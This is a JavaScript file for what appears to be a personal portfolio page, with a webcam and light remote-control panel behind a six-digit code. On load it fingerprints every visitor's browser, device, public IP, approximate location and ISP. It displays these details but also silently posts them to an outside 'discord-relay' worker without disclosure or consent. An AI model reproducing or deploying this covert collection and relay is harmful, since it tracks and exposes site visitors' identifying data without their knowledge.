const output = document.querySelector('#output');
const welcome = document.querySelector('#welcome');
const continueButton = document.querySelector('#continue');
const intro = document.querySelector('#intro');
const portfolio = document.querySelector('#portfolio');
const lightCode = document.querySelector('#light-code');
const lightControls = document.querySelector('#light-controls');
const controlLightButton = document.querySelector('#control-light');
const backToPortfolioButton = document.querySelector('#back-to-portfolio');
const enterLightCodeButton = document.querySelector('#enter-light-code');
const codeMessage = document.querySelector('#code-message');
const codeInputs = [...document.querySelectorAll('.code-input')];
const turnOnLightButton = document.querySelector('#turn-on-light');
const turnOffLightButton = document.querySelector('#turn-off-light');
const snapshotLightButton = document.querySelector('#snapshot-light');
const lightControlMessage = document.querySelector('#light-control-message');
const lightSnapshotFrame = document.querySelector('#light-snapshot-frame');
const lightSnapshot = document.querySelector('#light-snapshot');
const lightAgentStatus = document.querySelector('#light-agent-status');
const lightAgentStatusText = document.querySelector('#light-agent-status-text');
const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

const WORKER_URL = 'https://discord-relay.rogo57157.workers.dev';
let lightAccessCode = '';
let lightAgentStatusInterval;
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function readable(value, fallback = 'unavailable') {
  return value === undefined || value === null || value === '' ? fallback : String(value);
}

async function networkDetails() {
  try {
    const response = await fetch('https://ipwho.is/', { cache: 'no-store' });
    if (!response.ok) throw new Error('Lookup failed');
    const data = await response.json();
    if (!data.success) throw new Error('Lookup unavailable');
    return {
      ip: readable(data.ip),
      network: [data.city, data.region, data.country].filter(Boolean).join(', ') || 'unavailable',
      timezone: readable(data.timezone?.id),
      org: readable(data.connection?.isp),
    };
  } catch {
    return { ip: 'unavailable', network: 'unavailable', timezone: 'unavailable', org: 'unavailable' };
  }
}

function browserDetails() {
  const nav = navigator;
  const screenInfo = window.screen;
  const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
  return {
    'user agent': readable(nav.userAgent),
    platform: readable(nav.userAgentData?.platform || nav.platform),
    language: readable(nav.language),
    languages: nav.languages?.join(', ') || 'unavailable',
    viewport: `${window.innerWidth} × ${window.innerHeight}`,
    screen: `${screenInfo.width} × ${screenInfo.height} @ ${screenInfo.colorDepth}-bit`,
    'pixel ratio': readable(window.devicePixelRatio),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unavailable',
    local_time: new Date().toLocaleString(),
    cookies: nav.cookieEnabled ? 'enabled' : 'disabled',
    'do not track': readable(nav.doNotTrack),
    online: nav.onLine ? 'yes' : 'no',
    connection: connection
      ? `${readable(connection.effectiveType)} / ${readable(connection.downlink)} Mbps`
      : 'unavailable',
    touch_points: readable(nav.maxTouchPoints),
    cpu_threads: readable(nav.hardwareConcurrency),
    device_memory: nav.deviceMemory ? `${nav.deviceMemory} GB` : 'unavailable',
  };
}

async function sendToWorker(facts) {
  try {
    await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(facts),
    });
  } catch {
    // Silently fail — never break the page.
  }
}

async function typeLine(label, value, delay) {
  const line = document.createElement('p');
  line.className = 'line';
  const prefix = document.createElement('span');
  prefix.className = 'label';
  prefix.textContent = `[${label.toUpperCase()}] `;
  const content = document.createElement('span');
  content.className = 'value';
  line.append(prefix, content);
  output.append(line);

  const text = readable(value);
  if (reduceMotion) {
    content.textContent = text;
    return;
  }
  for (const character of text) {
    content.textContent += character;
    await wait(delay);
  }
  await wait(95);
}

async function run() {
  output.replaceChildren();
  welcome.hidden = true;
  continueButton.hidden = true;

  await typeLine('status', 'initializing browser observation...', 12);
  const local = browserDetails();
  const remote = await networkDetails();

  const facts = {
    ...local,
    'public ip': remote.ip,
    'approx. network location': remote.network,
    'network timezone': remote.timezone,
    'network provider': remote.org,
  };

  void sendToWorker(facts);

  for (const [label, value] of Object.entries(facts)) {
    await typeLine(label.replaceAll('_', ' '), value, 5);
  }

  await typeLine('scan', 'complete', 20);
  if (!reduceMotion) await wait(450);
  welcome.hidden = false;
  await wait(2000);
  continueButton.hidden = false;
}

continueButton.addEventListener('click', () => {
  intro.hidden = true;
  portfolio.hidden = false;
  window.scrollTo({ top: 0, behavior: reduceMotion ? 'auto' : 'smooth' });
});

controlLightButton.addEventListener('click', () => {
  portfolio.hidden = true;
  lightCode.hidden = false;
  codeInputs[0].focus();
});

function updateLightAgentStatus(working) {
  lightAgentStatus.classList.toggle('is-working', working);
  lightAgentStatusText.textContent = working ? 'Working' : 'Offline';
}

async function checkLightAgentStatus() {
  if (!lightAccessCode) return;

  try {
    const response = await fetch(`${WORKER_URL}/light-status`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: lightAccessCode }),
      cache: 'no-store',
    });
    if (!response.ok) throw new Error('Status unavailable');
    const result = await response.json();
    updateLightAgentStatus(result.online === true);
  } catch {
    updateLightAgentStatus(false);
  }
}

function startLightAgentStatusChecks() {
  clearInterval(lightAgentStatusInterval);
  void checkLightAgentStatus();
  lightAgentStatusInterval = setInterval(checkLightAgentStatus, 4000);
}

backToPortfolioButton.addEventListener('click', () => {
  clearInterval(lightAgentStatusInterval);
  lightCode.hidden = true;
  portfolio.hidden = false;
  codeMessage.textContent = '';
  controlLightButton.focus();
});

async function verifyLightCode() {
  const code = codeInputs.map((input) => input.value).join('');
  if (!/^\d{6}$/.test(code)) {
    codeMessage.textContent = 'Enter all 6 digits to continue.';
    codeInputs.find((input) => !input.value)?.focus();
    return;
  }

  enterLightCodeButton.disabled = true;
  enterLightCodeButton.textContent = 'Checking…';
  codeMessage.textContent = '';

  try {
    const response = await fetch(`${WORKER_URL}/verify-light-code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code }),
    });
    if (!response.ok) throw new Error('Verification service unavailable');

    const result = await response.json();
    if (result.valid === true) {
      lightAccessCode = code;
      codeInputs.forEach((input) => { input.value = ''; });
      lightCode.hidden = true;
      lightControls.hidden = false;
      startLightAgentStatusChecks();
      lightControls.querySelector('button').focus();
    } else {
      codeMessage.textContent = 'That code is not correct. Try again.';
      codeInputs.forEach((input) => { input.value = ''; });
      codeInputs[0].focus();
    }
  } catch {
    codeMessage.textContent = 'Could not verify the code. Please try again.';
  } finally {
    enterLightCodeButton.disabled = false;
    enterLightCodeButton.innerHTML = 'Enter <span aria-hidden="true">→</span>';
  }
}

enterLightCodeButton.addEventListener('click', verifyLightCode);
codeInputs.forEach((input) => {
  input.addEventListener('keydown', (event) => {
    if (event.key === 'Enter') verifyLightCode();
  });
});

async function sendLightCommand(action) {
  if (!lightAccessCode) {
    lightControlMessage.textContent = 'Enter the access code first.';
    return;
  }

  const buttons = [turnOnLightButton, turnOffLightButton, snapshotLightButton];
  buttons.forEach((controlButton) => { controlButton.disabled = true; });
  lightControlMessage.textContent = `Sending ${action === 'on' ? 'turn on' : 'turn off'} command…`;

  try {
    const response = await fetch(`${WORKER_URL}/light-control`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, code: lightAccessCode }),
    });
    const result = await response.json();
    if (!response.ok || result.queued !== true) {
      throw new Error(result.error || 'The command could not be queued.');
    }
    lightControlMessage.textContent = 'Command queued. The light agent must be running on your computer.';
  } catch (error) {
    lightControlMessage.textContent = error.message || 'Could not reach the light agent.';
  } finally {
    buttons.forEach((controlButton) => { controlButton.disabled = false; });
  }
}

turnOnLightButton.addEventListener('click', () => sendLightCommand('on'));
turnOffLightButton.addEventListener('click', () => sendLightCommand('off'));

function newSnapshotRequestId() {
  if (window.crypto?.randomUUID) return window.crypto.randomUUID();
  return `${Date.now()}-${Math.random().toString(16).slice(2)}`;
}

async function requestLightSnapshot() {
  if (!lightAccessCode) {
    lightControlMessage.textContent = 'Enter the access code first.';
    return;
  }

  const buttons = [turnOnLightButton, turnOffLightButton, snapshotLightButton];
  buttons.forEach((controlButton) => { controlButton.disabled = true; });
  lightControlMessage.textContent = 'Requesting webcam snapshot…';

  const requestId = newSnapshotRequestId();
  try {
    const response = await fetch(`${WORKER_URL}/light-control`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'snapshot', code: lightAccessCode, requestId }),
    });
    const result = await response.json();
    if (!response.ok || result.queued !== true) {
      throw new Error(result.error || 'The snapshot could not be queued.');
    }

    for (let attempt = 0; attempt < 30; attempt += 1) {
      await wait(2000);
      const photoResponse = await fetch(`${WORKER_URL}/light-photo`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: lightAccessCode, requestId }),
      });
      const photoResult = await photoResponse.json();
      if (!photoResponse.ok) {
        throw new Error(photoResult.error || 'Could not check snapshot status.');
      }
      if (photoResult.photo?.url) {
        lightSnapshot.src = `${photoResult.photo.url}?request=${encodeURIComponent(requestId)}`;
        lightSnapshotFrame.hidden = false;
        lightControlMessage.textContent = 'Snapshot uploaded.';
        return;
      }
      lightControlMessage.textContent = 'Waiting for the webcam snapshot…';
    }

    throw new Error('The snapshot agent did not respond in time.');
  } catch (error) {
    lightControlMessage.textContent = error.message || 'Could not capture a snapshot.';
  } finally {
    buttons.forEach((controlButton) => { controlButton.disabled = false; });
  }
}

snapshotLightButton.addEventListener('click', requestLightSnapshot);

function fillCode(startIndex, value) {
  const digits = value.replace(/\D/g, '').slice(0, codeInputs.length - startIndex);
  for (let offset = 0; offset < digits.length; offset += 1) {
    codeInputs[startIndex + offset].value = digits[offset];
  }
  const nextIndex = Math.min(startIndex + digits.length, codeInputs.length - 1);
  codeInputs[nextIndex].focus();
  codeInputs[nextIndex].select();
}

codeInputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    const digits = input.value.replace(/\D/g, '');
    if (!digits) {
      input.value = '';
      return;
    }
    if (digits.length > 1) {
      fillCode(index, digits);
      return;
    }
    input.value = digits;
    if (index < codeInputs.length - 1) codeInputs[index + 1].focus();
  });

  input.addEventListener('paste', (event) => {
    event.preventDefault();
    fillCode(index, event.clipboardData.getData('text'));
  });

  input.addEventListener('keydown', (event) => {
    if (event.key === 'Backspace' && !input.value && index > 0) {
      codeInputs[index - 1].focus();
    } else if (event.key === 'ArrowLeft' && index > 0) {
      codeInputs[index - 1].focus();
    } else if (event.key === 'ArrowRight' && index < codeInputs.length - 1) {
      codeInputs[index + 1].focus();
    }
  });
});

run();
